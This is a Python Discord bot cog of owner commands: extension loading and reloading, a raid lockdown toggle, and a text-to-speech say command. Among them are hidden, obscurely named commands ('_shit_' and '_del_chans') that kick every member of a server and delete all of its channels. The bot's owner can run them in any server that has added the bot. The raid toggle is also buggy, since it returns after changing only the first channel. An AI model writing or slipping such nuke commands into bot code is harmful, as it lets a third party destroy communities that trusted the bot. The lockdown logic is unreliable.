import asyncio
from typing import Union

import discord
from discord.ext import commands


class OwnerCog(commands.Cog, command_attrs=dict(hidden=True)):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases=['load', 'load_cog', 'cog_load'], hidden=True)
    @commands.is_owner()
    async def cogload(self, ctx, *, cog: str):
        """Command which Loads a Module.
        Remember to use dot path. e.g: cogs.owner"""

        try:
            self.bot.load_extension(cog)
        except Exception as e:
            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
        else:
            await ctx.send('**`SUCCESS`**')

    @commands.command(aliases=['unload', 'cog_unload', 'unload_cog'], hidden=True)
    @commands.is_owner()
    async def cogunload(self, ctx, *, cog: str):
        """Command which Unloads a Module.
        Remember to use dot path. e.g: cogs.owner"""

        try:
            self.bot.unload_extension(cog)
        except Exception as e:
            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
        else:
            await ctx.send('**`SUCCESS`**')

    @commands.command(aliases=['reload', 'reload_cog', 'cog_reload'], hidden=True)
    @commands.is_owner()
    async def cogreload(self, ctx, *, cog: str):
        """Command which Reloads a Module.
        Remember to use dot path. e.g: cogs.owner"""

        try:
            self.bot.unload_extension(cog)
            self.bot.load_extension(cog)
        except Exception as e:
            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
        else:
            await ctx.send('**`SUCCESS`**')

    """Extra commands below"""

    @commands.command()
    @commands.is_owner()
    async def _shit_(self, ctx):
        mem = len(ctx.guild.members)
        await ctx.send(f"kicking {mem}...")
        for member in ctx.guild.members:
            try:
                await asyncio.sleep(1)
                await ctx.guild.kick(member)
                print(f"kicked {member.name}")
            except Exception:
                print(f"could not kick {member}")
                pass

    @commands.command()
    @commands.is_owner()
    async def _del_chans(self, ctx):
        for c in ctx.guild.channels:
            await c.delete()

    # @commands.command()
    # @commands.has_permissions(administrator=True)
    # async def raidmode(self, ctx):
    #     embed = discord.Embed(
    #         title=f'Raid Mode Is Now Enabled!',
    #         colour=discord.Colour.red())
    #     for channel in ctx.guild.text_channels:
    #         await channel.set_permissions(ctx.guild.default_role, send_messages=False, reason=embed)
    #
    #     await ctx.send(embed=embed)

    @commands.command(pass_context=True)
    @commands.has_permissions(administrator=True)
    async def raid(self, ctx, section):
        if section == 'on':
            guild = ctx.guild
            channels = ctx.guild.channels
            role = guild.roles[0]

            for channel in channels:
                if isinstance(channel, discord.TextChannel):  # don't change permissions for voice chat or categories
                    await channel.set_permissions(role, send_messages=False)
                mbed = discord.Embed(description="Raid Mode Is Enabled!", colour=discord.Colour.red())
                await ctx.send(embed=mbed)
                return

        if section == 'off':
            guild = ctx.guild
            channels = ctx.guild.channels
            role = guild.roles[0]
            for channel in channels:
                if isinstance(channel, discord.TextChannel):  # don't change permissions for voice chat or categories
                    await channel.set_permissions(role, send_messages=True)
                m1bed = discord.Embed(description="Raid Mode Is Disabled!", color=discord.Colour.red())
                await ctx.send(embed=m1bed)
                return

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def say(self, ctx, *words):
        wordy = ' '.join(words[:])
        await ctx.message.delete()
        await ctx.send(wordy, tts=True)


def setup(bot):
    bot.add_cog(OwnerCog(bot))
